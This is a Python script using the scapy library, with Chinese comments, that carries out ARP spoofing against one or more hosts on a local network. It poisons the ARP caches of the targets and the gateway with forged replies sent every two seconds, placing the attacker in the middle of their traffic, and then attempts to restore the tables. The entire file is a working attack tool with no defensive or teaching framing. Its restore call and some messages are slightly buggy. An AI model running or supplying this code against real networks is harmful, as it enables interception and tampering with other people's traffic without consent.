"""
    update ARP 欺骗
    多个 ip 地址欺骗，只能在同个局域网内实施
"""

from scapy.all import *
import sys

interface = "WLAN"

target_ips = [
    "192.168.0.104",
]
target_macs = []

gateway_ip = "192.168.0.1"


def main():
    # 设置嗅探的网卡
    conf.iface = interface
    # 关闭输出
    conf.verb = 0
    print("[*] Setting up %s" % interface)

    gateway_mac = get_mac(gateway_ip)

    if gateway_mac is None:
        print("[!!] Failed to get gateway MAC. Exiting.")
        sys.exit(0)
    else:
        print("[*] Gateway %s is at %s" % (gateway_ip, gateway_mac))

    for ip in target_ips:
        target_mac = get_mac(ip)
        if target_mac is None:
            print("[!!] Failed to get gateway MAC. Exiting.")
            sys.exit(0)
        else:
            target_macs.append(target_mac)
            print("[*] Gateway %s is at %s" % (ip, target_mac))

    try:
        poison_target(gateway_ip, gateway_mac, target_ips, target_macs)
    except Exception as e:
        print("异常：" + str(e))
    finally:
        for ip in target_ips:
            restore_target(gateway_ip, gateway_mac, ip, target_macs)
        print("[*] ARP poison attack finished")


def get_mac(ip_address):
    responses, unanswered = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip_address), timeout=2, retry=10)
    # 返回从相应数据中获取的MAC地址
    for s, r in responses:
        return r[Ether].src
    return None


def poison_target(gateway_ip, gateway_mac, target_ips, target_macs):
    number = len(target_ips)
    poison_targets = []
    poison_gateways = []
    for num in range(number):
        # 欺骗目标地址
        poison_target = ARP()
        poison_target.op = 2
        poison_target.psrc = gateway_ip
        # poison_target.hwsrc = black_mac
        poison_target.pdst = target_ips[num]
        poison_target.hwdst = target_macs[num]
        poison_targets.append(poison_target)
        # 欺骗网关地址
        poison_gateway = ARP()
        poison_gateway.op = 2
        poison_gateway.psrc = target_ips[num]
        # poison_gateway.hwsrc = black_mac
        poison_gateway.pdst = gateway_ip
        poison_gateway.hwdst = gateway_mac
        poison_gateways.append(poison_gateway)

    print("[*] Beginning the ARP poison. [CTRL-C to stop]")
    while True:
        for num in range(number):
            send(poison_targets[num])
            send(poison_gateways[num])
        print("已发送一次 ARP 欺骗包 -------")
        time.sleep(2)


def restore_target(gateway_ip, gateway_mac, target_ip, target_mac):
    # 以下代码中调用 send 函数的方式稍有不同
    print("[*] Restoring target....")
    send(ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=gateway_mac), count=5)
    send(ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=target_mac), count=5)


if __name__ == '__main__':
    main()

